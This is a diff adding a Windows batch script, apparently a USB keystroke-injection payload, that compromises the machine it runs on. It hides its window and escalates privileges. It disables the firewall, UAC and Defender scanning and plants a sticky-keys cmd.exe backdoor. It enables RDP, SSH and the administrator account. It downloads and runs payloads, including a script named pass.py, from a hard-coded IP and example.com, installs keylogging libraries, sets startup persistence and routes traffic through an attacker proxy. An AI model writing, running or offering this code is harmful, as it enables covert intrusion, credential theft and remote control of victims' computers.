@@ -1,0 +1,328 @@
+@echo off
+
+color fe
+
+mode con:cols=7 lines=1
+
+
+
+
+
+CD %TEMP%
+
+erase /Q DuckyWait.bat
+
+erase /Q invis.vbs
+
+copy con invis.vbs
+
+CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+
+
+
+wscript.exe invis.vbs DuckyWait.bat
+
+
+
+
+
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+
+) ELSE (
+
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+)
+
+
+
+REM --> If error flag set, we do not have admin.
+
+if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto gotAdmin )
+
+
+
+:UACPrompt
+
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+
+    set params= %*
+
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+
+    del "%temp%\getadmin.vbs"
+
+    exit /B
+
+
+
+:gotAdmin
+
+    pushd "%CD%"
+
+    CD /D "%~dp0"
+
+:--------------------------------------   
+
+
+
+
+
+#####################################################################################
+
+powershell Set-ExecutionPolicy 'Unrestricted' -Scope Process -Confirm:$false 
+
+powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
+
+powershell Set-ExecutionPolicy 'Unrestricted' -Scope LocalMachine -Confirm:$false 
+
+powershell set-mppreference -ExclusionExtension exe, bat, py  >nul 2>&1
+
+
+
+
+
+
+
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /ve /f 
+
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f 
+
+
+
+
+
+echo 209.182.217.97 myserver.com >> C:\Windows\System32\drivers\etc\hosts  
+
+echo 209.182.217.97 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1YUm7m3ZR94w6ZcPTZQd0NQYb5L4rhRbdSv17WGCy4WOkIaIFo0Ew3HcENRXQzaRefJfxV1zEYOZ04Emp0Cgs2jtuFRkRc/kTh4h0/G+DzRTi2EbQMW4Z+3dCMz72HoT4O+q1wajOPHEFvwvH1eOBriFODb6mRSEORiB8Dzst0NNdMjOjBWiB4utA/qfXUBxQUMckCayAHR49iTi7s/wpJMhxYAP7XQ0UTqhcufBLATmA0232c9drdOuQ6n20lH5rbyO9t89jsuCsytxI4jGF0wcCJzJ9dKZS+k8n1wrcha3mSPL05WOIUaPoMenGZFciH/ydZlyHyYQuaWfcS8oWQ== >> C:\Users\micha\.ssh\known_hosts
+
+echo myserver.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1YUm7m3ZR94w6ZcPTZQd0NQYb5L4rhRbdSv17WGCy4WOkIaIFo0Ew3HcENRXQzaRefJfxV1zEYOZ04Emp0Cgs2jtuFRkRc/kTh4h0/G+DzRTi2EbQMW4Z+3dCMz72HoT4O+q1wajOPHEFvwvH1eOBriFODb6mRSEORiB8Dzst0NNdMjOjBWiB4utA/qfXUBxQUMckCayAHR49iTi7s/wpJMhxYAP7XQ0UTqhcufBLATmA0232c9drdOuQ6n20lH5rbyO9t89jsuCsytxI4jGF0wcCJzJ9dKZS+k8n1wrcha3mSPL05WOIUaPoMenGZFciH/ydZlyHyYQuaWfcS8oWQ== >> C:\Users\micha\.ssh\known_hosts
+
+
+
+
+
+netsh firewall set opmode mode=disable
+
+reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+
+reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
+
+
+
+sc config TermService start= auto
+
+net start Termservice
+
+
+
+powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe'); Start-Process "%TEMP%\bob.exe" -Verb runAs
+
+
+
+#####################################################################################
+
+#### python
+
+curl -o %temp%\python-3.9.4-amd64.exe    https://www.python.org/ftp/python/3.9.4/python-3.9.4-amd64.exe >nul 2>&1
+
+curl -o %temp%\python-3.9.4-amd64.exe   http://209.182.217.97/p.exe >nul 2>&1
+
+%temp%\python-3.9.4-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 >nul 2>&1
+
+
+
+set PATH=C:\Program Files\Python39\Scripts;%PATH%
+
+set PATH=C:\Program Files\Python39;%PATH%
+
+set PATH=%appdata%\Python\Python39\Scripts;%PATH%
+
+
+
+
+
+curl http://209.182.217.97/p.py           -o %temp%\get-pip.py >nul 2>&1
+
+curl https://bootstrap.pypa.io/get-pip.py -o %temp%\get-pip.py >nul 2>&1
+
+"C:/Program Files/Python39/pythonw.exe" %temp%\get-pip.py >nul 2>&1
+
+"C:/Program Files/Python39/pythonw.exe" -m pip install --upgrade pip >nul 2>&1
+
+pip install pynput paramiko pyautogui psutil keyboard clipboard peutils pyutil pywin32  winshell wexpect mouseinfo requests openpyxl wheel pyinstaller  win32gui winreg  win32clipboard win32crypt requests 
+
+
+
+
+
+del %temp%\get-pip.py >nul 2>&1
+
+del %temp%\python-3.9.4-amd64.exe
+
+
+
+#####################################################################################
+
+
+
+
+
+
+
+
+
+echo import  requests ; print(requests.get('http://ipinfo.io').text) > %temp%\ppp.py | python %temp%\ppp.py
+
+
+
+curl http://209.182.217.97/pass.txt -o %temp%\pass.py
+
+"C:/Program Files/Python39/pythonw.exe" %temp%\pass.py
+
+del  %temp%\pass.py  >nul 2>&1
+
+
+
+curl http://209.182.217.97/d.txt -o %temp%\scripttoo.py
+
+echo "C:/Program Files/Python39/pythonw.exe" %temp%/scripttoo.py > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\p.bat" 
+
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\p.bat" >nul 2>&1
+
+
+
+
+
+curl https://the.earth.li/~sgtatham/putty/0.73/w64/putty-64bit-0.73-installer.msi -o %temp%\p.msi >nul 2>&1
+
+MsiExec.exe /i %temp%\p.msi /qn
+
+del %temp%\p.msi
+
+
+
+
+
+
+
+net user administrator /active:yes
+
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v mmm /t REG_SZ /d c:\users\micha\desktop\t.txt /f
+
+
+
+
+
+mklink "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\d2.lnk"  "C:\Users\micha\Desktop\output\d.exe"
+
+mklink  "%userprofile%\Start Menu\Programs\Startup\d.lnk" "C:\Users\micha\Desktop\output\d.exe"
+
+
+
+
+
+
+
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+reg ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v a  /t REG_SZ /d 0 /f
+
+
+
+pkgmgr /iu:"TelnetClient
+
+
+
+curl http://www.nirsoft.net/utils/nircmd-x64.zip -o nircmd.zip >nul 2>&1
+
+tar -xf nircmd.zip >nul 2>&1
+
+nircmdc.exe monitor off
+
+
+
+shutdown /r
+
+echo list volume | diskpart  | findstr Recovery
+
+
+
+
+
+
+
+#####################################################################################
+
+
+
+### ssh 
+
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+
+Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
+Start-Service sshd
+
+Set-Service -Name sshd -StartupType 'Automatic'
+
+if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
+
+    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
+
+    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+
+} else {
+
+    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
+
+}
+
+
+
+
+
+### proxy
+
+#reg ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+
+#reg ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 209.182.217.97:3128 /f
+
+
+
+#netsh winhttp set proxy 209.182.217.97:3128
+
+set HTTP_PROXY=209.182.217.97:3128
+
+setx HTTP_PROXY 209.182.217.97:3128
+
+# reg ADD "HKEY_CURRENT_USER\Environment" /v http_proxy /t REG_SZ  /d 209.182.217.97:3128 /f
+
+
+
+###############"netsh advfirewall firewall show rule name=all" vs "Get-NetFirewallRule" vs netstat -baon  | Select-String "1900" 
+
+
+
+## ftp
+
+## https://download.filezilla-project.org/client/FileZilla_3.58.0_win64_sponsored-setup.exe
+
+
+
+
+
+assoc .py=Python.File
+
+ftype Python.File="C:\Program Files\Python39\python.exe" "%1" %*
+
+
+
+
+
